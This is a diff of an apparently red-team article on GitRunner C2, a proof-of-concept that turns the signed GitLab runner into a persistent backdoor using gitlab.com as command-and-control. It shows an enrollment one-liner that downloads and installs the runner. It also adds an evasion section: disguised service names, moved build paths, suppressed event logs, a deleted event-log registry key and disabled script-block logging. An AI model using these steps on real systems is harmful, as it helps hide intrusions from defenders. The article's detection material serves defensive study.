@@ -22,9 +22,9 @@ Modern DevOps teams rely on tools and platforms to automate workflows, accelerat
 
 Version control platforms such as GitHub and GitLab allow teams to configure pipelines and execute them on either **cloud-hosted runners** or developer-managed **self-hosted runners**.
 
-Self-hosted runners require installing a runner agent on the host machine, which then connects to the GitLab instance and polls for new jobs. When a pipeline triggers, GitLab dispatches jobs to available runners for execution. This model closely mirrors the operation of a Command and Control (C2) framework - fetch a command, execute it, return the output to the operator.
+Self-hosted runners require installing a runner agent on the host machine, which then connects to the GitLab instance and polls for new jobs. When a pipeline triggers, GitLab dispatches jobs to available runners for execution. This model closely mirrors the operation of a Command and Control (C2) framework: fetch a command, execute it, return the output to the operator.
 
-The GitLab runner installer for Windows is digitally signed by GitLab, making it trusted by default on most systems. It runs as a Windows service and communicates exclusively over outbound HTTPS to `gitlab.com:443`, blending seamlessly with normal developer traffic. As a legitimate tool used by thousands of development teams worldwide, it currently has 0 detections on VirusTotal.
+The GitLab runner installer for Windows is digitally signed by GitLab, making it trusted by default on most systems. It runs as a Windows service and communicates exclusively over outbound HTTPS to `gitlab.com:443`, blending seamlessly with normal developer traffic. As a legitimate tool used by thousands of development teams worldwide, as of publication it has 0 detections on VirusTotal [[25]](#references).
 
 In this article, I demonstrate how self-hosted runners can be abused by installing them on a compromised machine as a persistent backdoor. A tool named **GitRunner C2** was built as a proof-of-concept, showing that a public GitLab instance can be repurposed as a fully functional C2 infrastructure using pipeline runners. The final section covers detection - the logs, artifacts, and behavioral signals the runner leaves behind for defenders.
 
@@ -38,22 +38,22 @@ In this article, I demonstrate how self-hosted runners can be abused by installi
 
 The abuse of CI/CD runners is not a new concept. At DEF CON 32, Khan and Stawinski [[1]](#references) demonstrated how GitHub Actions misconfigurations allowed low-privileged users to trigger jobs on internal machines, escalate privileges, and execute supply chain attacks - including a successful compromise of the PyTorch public repository. Praetorian [[2]](#references) showed that a leaked Personal Access Token is enough to turn self-hosted runners into a persistent backdoor, and noted that GitHub's workflow logging is gated behind Enterprise plans, leaving most organizations blind. Synacktiv [[3]](#references) and PulseSecurity [[4]](#references) further documented exploitation techniques across both GitHub and GitLab, including attack paths via shared runners.
 
-On the threat intelligence front, Sysdig documented real-world actors weaponizing self-hosted runners at scale - most notably the Shai-Hulud worm [[5]](#references) [[6]](#references) - which deployed official GitHub runner binaries onto compromised machines as a persistence mechanism, using public repositories as C2 infrastructure and spreading across over 25,000 repositories. Closest to the work presented here, GitLab's own red team [[7]](#references) demonstrated that GitLab CI infrastructure could be repurposed as a C2 server using a custom GoLang agent.
+On the threat intelligence front, Sysdig documented real-world actors weaponizing self-hosted runners at scale - most notably the Shai-Hulud worm [[5]](#references) [[6]](#references), which deployed official GitHub runner binaries onto compromised machines as a persistence mechanism, using public repositories as C2 infrastructure and spreading across over 25,000 repositories. Closest to the work presented here, GitLab's own red team [[7]](#references) demonstrated that GitLab CI infrastructure could be repurposed as a C2 server using a custom GoLang agent.
 
-While prior work has documented the backdoor potential of runners, exploited misconfigurations at scale, and observed threat actors using runners for persistence, none has delivered a purpose-built operator platform around this technique. GitRunner C2 takes a different approach: it abuses the legitimate `gitlab-runner.exe` binary as the implant - trusted by the OS and ignored by most EDR products - wrapped in a full operator interface requiring no custom code on the endpoint.
+While prior work has documented the backdoor potential of runners, exploited misconfigurations at scale, and observed threat actors using runners for persistence, none has delivered a purpose-built operator platform around this technique. GitRunner C2 takes a different approach: it abuses the legitimate `gitlab-runner.exe` binary as the implant, trusted by the OS and ignored by most EDR products, wrapped in a full operator interface requiring no custom code on the endpoint.
 
 
 
 
 ## Why GitLab Runners Make Effective C2 Infrastructure
 
-The `gitlab-runner` binary is digitally signed by `GitLab Inc.` [[8]](#references) and distributed through official channels, placing it (near) the category of Living-off-the-Land Binaries (LOLBins) - despite not being natively installed in the system - it is legitimate software that, in principle, security tooling trusts.
+The `gitlab-runner` binary is digitally signed by `GitLab Inc.` [[8]](#references) and distributed through official channels, placing it near the category of Living-off-the-Land Binaries (LOLBins). Despite not being natively installed on the system, it is legitimate software that security tooling trusts by default.
 
 All communication is outbound HTTPS on port 443 to `gitlab.com` (or a self-hosted instance). From a network perspective, the traffic is indistinguishable from a developer's CI pipeline: the runner polls for jobs, executes them, and posts results - the same behavior as any legitimate build machine. No inbound ports, no listener or unusual destination.
 
 On Windows, the runner installs as a native service via `OpenSCManager` Windows API [[9]](#references) (the library imported by GitLab Runner application), inheriting the privileges of its configured account. Deploying it under `SYSTEM` or a `domain service account` gives the operator persistent, high-privilege execution that survives reboots.
 
-Finally, GitLab's own infrastructure provides the queuing, job history, and output retention that a C2 operator normally has to build from scratch. Commands are stored as pipeline runs, output is preserved in job traces, and the operator interacts through a standard web API - all **without any additional backend infrastructure**.
+Finally, GitLab's own infrastructure provides the queuing, job history, and output retention that a C2 operator normally has to build from scratch. Commands are stored as pipeline runs, output is preserved in job traces, and the operator interacts through a standard web API, all **without any additional backend infrastructure**.
 
 
 
@@ -95,7 +95,7 @@ GitRunner C2 is a Vue 3 single-page application (SPA) that operates entirely thr
   +---------------------+   Output/Artifacts  +---------------------+
 ```
 
-**Enrollment** takes a single elevated PowerShell one-liner. The operator enters a unique tag and an optional description in the UI; the platform calls the GitLab runner creation API to obtain a registration token, then displays a PowerShell command that downloads the official `gitlab-runner-windows-amd64.exe` binary using `Invoke-WebRequest (IWR)`, registers it against the operator's project, and installs and starts it as a Windows service. No files are distributed by the operator - the binary comes directly from GitLab's S3 URL.
+**Enrollment** takes a single elevated PowerShell one-liner. The operator enters a unique tag and an optional description in the UI; the platform calls the GitLab runner creation API to obtain a registration token, then displays a PowerShell command that downloads the official `gitlab-runner-windows-amd64.exe` binary directly from GitLab's S3 distribution endpoint, registers it against the operator's project, and installs and starts it as a Windows service. No files are distributed by the operator.
 
 **Feature set.** Once an endpoint is enrolled and online, the operator interacts through a tabbed interface:
 
@@ -156,6 +156,8 @@ Invoke-WebRequest https://gitlab-runner-downloads.s3.amazonaws.com/latest/binari
 & $r install --working-directory $d --config $c;
 & $r start
 ```
+
+The basic form above is shown for clarity. The actual GitRunner C2 enrollment command incorporates the evasion measures covered in the [Evasion & OPSEC](#evasion--opsec) section: service renaming, working directory relocation, log suppression, and per-runner config hardening.
 
 **Step 3 - Execute on the endpoint.** The command is run in an elevated PowerShell session on the target machine. It downloads the official `gitlab-runner-windows-amd64.exe` binary directly from GitLab's S3 distribution endpoint, registers it against the operator's project using the provided token, then installs and starts it as a Windows service.
 
@@ -311,7 +313,7 @@ Sysmon was installed on the Windows 11 VM using the [Olaf Hartong modular config
 </ossec_config>
 ```
 
-What a defender sees on the endpoint: `gitlab-runner.exe` spawning `powershell.exe`, repeated outbound HTTPS to `gitlab.com:443`, service installation under `C:\GitLab-Runner\`, PowerShell Script Block Logging (EID 4104) capturing commands in plaintext.
+What a defender sees on the endpoint: `gitlab-runner.exe` spawning `powershell.exe`, repeated outbound HTTPS to `gitlab.com:443`, service installation under the configured working directory, PowerShell Script Block Logging (EID 4104) capturing commands in plaintext.
 
 
 ### Network Communication
@@ -550,7 +552,152 @@ I might add this section later :)
 
 
 
-### MITRE ATT&CK Mapping
+
+
+## Evasion & OPSEC
+
+
+### Renaming the Service
+
+By default, the runner installs under the service name `gitlab-runner`, a string that appears verbatim in EID 7045 (`ServiceName`), Sysmon EID 13 (`TargetObject`), and as the custom Event Log source name. Any detection rule targeting this string will match immediately.
+
+The `--service` flag at install time replaces it with an arbitrary name:
+
+```powershell
+.\gitlab-runner.exe install --service "WinUpdateManager"
+```
+
+This single change causes all three of those event fields to reflect the new name, defeating signature-based rules without any other modification to the runner's behavior.
+
+
+
+### Relocating the Working Directory
+
+The default working directory `C:\GitLab-Runner\` is predictable and appears throughout the detection artifacts covered earlier in Sysmon EID 11 file creation events, EID 13 registry writes, and most notably in EID 4104 script blocks where the full build path `C:\GitLab-Runner\builds\<token>\<id>\` is logged in plaintext.
+
+Two paths need to be considered separately: the runner's install directory and the directory where job scripts are written.
+
+The install directory containing the binary and `config.toml` must be persistent across reboots, so it stays under `C:\ProgramData\<service-name>\`. The `--working-directory` and `--config` flags relocate it at install time:
+
+```powershell
+.\gitlab-runner.exe install `
+  --service "WinUpdateManager" `
+  --working-directory "C:\ProgramData\WinUpdateManager" `
+  --config "C:\ProgramData\WinUpdateManager\config.toml"
+```
+
+Job scripts and build artifacts are a separate concern. The runner writes temporary `.ps1` files to the build directory for every job, and these land inside `--working-directory` by default. The `builds_dir` key in `config.toml` redirects them independently:
+
+```toml
+[[runners]]
+  builds_dir = "C:\\Windows\\Temp"
+```
+
+`C:\Windows\Temp\` receives constant read/write activity from legitimate system processes, making new file events there harder to isolate. Job scripts appear as short-lived `.ps1` files in that high-noise directory rather than under a clearly attacker-controlled path. Generic rules anchored to `C:\GitLab-Runner\` will no longer fire, and the build path segment `\builds\<token>\<id>\` is now buried under `C:\Windows\Temp\`.
+
+
+
+### Running as a Domain or Local Account
+
+By default the runner service runs as `LocalSystem`, the highest privilege account on the machine, and a value that stands out in EID 7045's `AccountName` field. In most environments, legitimate services running as `LocalSystem` are well-known and static; a new one appearing is anomalous.
+
+The `--user` and `--password` flags configure the service to run under a specific account instead:
+
+```powershell
+.\gitlab-runner.exe install `
+  --service "WinUpdateManager" `
+  --user "DOMAIN\svc-build" `
+  --password "..."
+```
+
+Running as an existing domain service account blends the runner into the environment's normal service account. In an Active Directory environment where service accounts are numerous and not closely monitored, this makes the runner significantly harder to isolate as suspicious based on account name alone.
+
+
+
+
+
+### Suppressing Event Log Output
+
+On Windows, the `install` command automatically registers the runner as a custom Event Log source under `HKLM\SYSTEM\CurrentControlSet\Services\EventLog\Application\<service-name>`. The result is the custom event provider covered in the detection section, where runner activity is visible directly in Event Viewer.
+
+**Disable syslog at install time.** The `--syslog=false` flag prevents the runner from writing to the Windows Event Log at runtime. The registry key is still created by `install`, but the runner will not emit events through it:
+
+```powershell
+.\gitlab-runner.exe install --service "WinUpdateManager" --syslog=false
+```
+
+**Suppress log output via `config.toml`.** Setting `log_level = "panic"` causes the runner to only log panic-level messages. Under normal operation nothing reaches that threshold, so the event source produces no entries regardless of whether `--syslog` is active:
+
+```toml
+log_level = "panic"
+```
+
+**Delete the event source registry key.** After installation, removing the key unregisters the custom provider entirely. Any log attempts will silently fail:
+
+```powershell
+Remove-Item "HKLM:\SYSTEM\CurrentControlSet\Services\EventLog\Application\WinUpdateManager"
+```
+
+**Suppress job trace output.** By default, every command the runner executes is echoed back to the GitLab CI job log, making operator activity visible in the GitLab UI. Setting `debug_trace_disabled = true` in the runner's `config.toml` block disables this:
+
+```toml
+[[runners]]
+  debug_trace_disabled = true
+```
+
+**Limit job log size.** The `output_limit` key caps the number of kilobytes the runner forwards to GitLab per job. Setting it to a low value reduces the volume of command output visible in the UI:
+
+```toml
+[[runners]]
+  output_limit = 1
+```
+
+**Reduce connection fingerprinting.** The `connection_max_age` global setting controls how long the runner keeps an HTTP connection alive before cycling it. Setting it to `"0"` disables persistent connections, which slightly reduces the runner's predictable network signature:
+
+```toml
+connection_max_age = "0"
+```
+
+To avoid creating the event source key in the first place, bypass `gitlab-runner install` entirely and create the service manually via `New-Service` or `sc.exe` pointing to `gitlab-runner.exe run`. The `Install()` call that registers the event source is never invoked, so the key is never written.
+
+
+
+### Adjusting the Polling Interval
+
+The runner polls GitLab for pending jobs every 3 seconds by default, producing a steady stream of outbound HTTPS requests to `gitlab.com:443`. At that frequency, the connection pattern is regular and high-volume, which is a potential signal for network-based detection rules looking for beaconing behavior.
+
+Setting `check_interval` in `config.toml` controls this:
+
+```toml
+check_interval = 60
+```
+
+Increasing the interval to 60 seconds or more reduces the polling frequency to something indistinguishable from routine background traffic. Software update checks, telemetry agents, and cloud heartbeats all follow similar periodic patterns. The trade-off is command latency: a 60-second interval means up to a minute before the runner picks up a dispatched job.
+
+For active operations where fast response is needed, a lower value such as 3 seconds is more practical. For long-term persistence where stealth matters more than speed, 60 seconds or higher is recommended.
+
+
+
+
+### Avoiding PowerShell Script Block Logging
+
+EID 4104 (Script Block Logging) is one of the most reliable detection signals generated by the runner. When the shell executor is configured to use PowerShell, every job step is executed via `powershell.exe`, and Windows logs the full decoded content of every script block to the event log, including the operator's command. This happens regardless of whether the command is passed via environment variable, executed with `Invoke-Expression`, or written to a file first.
+
+In testing, Wazuh consistently raised alerts for EID 4104 events containing patterns such as `Invoke-Expression`, `Get-Content`, and environment variable lookups. Changing the execution method from `IEX $env:CMD` to a file-based approach (`[IO.File]::WriteAllText` + `& script.ps1`) did not suppress the alert: Sysmon EID 11 fired on the `.ps1` file creation regardless of the target directory.
+
+**This signal cannot be eliminated with the shell/powershell executor.** EID 4104 is generated by the PowerShell engine itself, not by the runner, and there is no runner-side configuration that prevents it.
+
+The only effective mitigations require access to the endpoint's audit policy:
+
+- Disable Script Block Logging via Group Policy or registry (`HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging\EnableScriptBlockLogging = 0`). This itself may be detected as a policy change.
+- Switch to a different executor. A custom executor that does not invoke `powershell.exe` generates no EID 4104 events, though it requires a custom binary on the endpoint.
+
+Operators relying on the shell executor should assume all executed commands are logged in plaintext on the endpoint.
+
+
+
+
+## MITRE ATT&CK Mapping
 
 <table>
   <thead>
@@ -620,7 +767,7 @@ I might add this section later :)
       <td>Command & Control</td>
       <td>T1102</td>
       <td>Web Service</td>
-      <td>GitLab infrastructure used as C2 relay -<br>no operator-controlled server required</td>
+      <td>GitLab infrastructure used as C2 relay;<br>no operator-controlled server required</td>
     </tr>
     <tr>
       <td>Command & Control</td>
